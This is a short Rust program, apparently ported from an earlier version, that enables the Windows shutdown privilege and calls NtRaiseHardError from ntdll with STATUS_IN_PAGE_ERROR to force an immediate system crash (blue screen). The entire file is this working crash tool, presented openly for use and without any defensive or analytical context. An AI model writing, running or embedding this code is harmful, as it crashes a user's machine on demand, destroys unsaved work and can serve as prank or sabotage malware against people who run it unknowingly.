//credit to sparkster for helping me rewrite in rust
use std::ptr;

#[link(name = "ntdll")]
extern "system" {
    fn RtlAdjustPrivilege(Privilege: u32, Enable: bool, CurrThread: bool, StatusPointer: *mut bool) -> u32;
    fn NtRaiseHardError(
        ErrorStatus: u32,
        Unless1: u32,
        Unless2: u32,
        Unless3: *mut usize,
        ValidResponseOption: u32,
        ResponsePointer: *mut u32,
    ) -> u32;
}

fn main() {
    let mut privilege_state = false;
    let mut error_response = 0;

    unsafe {
        RtlAdjustPrivilege(19, true, false, &mut privilege_state);
        println!("Crashing...");
        NtRaiseHardError(
            0xC0000006u32, // STATUS_IN_PAGE_ERROR
            0,
            0,
            ptr::null_mut(),
            6,
            &mut error_response,
        );
        println!("Crash failed!");
    }
}
